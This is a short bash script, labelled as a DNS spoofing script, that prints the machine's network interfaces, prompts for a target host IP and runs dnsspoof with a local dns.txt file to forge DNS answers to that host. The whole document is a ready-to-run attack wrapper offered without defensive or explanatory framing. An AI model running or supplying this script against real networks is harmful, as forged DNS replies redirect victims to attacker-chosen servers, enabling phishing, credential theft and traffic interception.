#!/bin/bash

# SCRIPT FOR DNS SPOOFING

echo ip interfaces:
ip address
echo Enter ip host:
read ip_host
echo

echo DNS spoofing with dns.txt with host ip $ip_host
sudo dnsspoof -f ./dns.txt host $ip_host
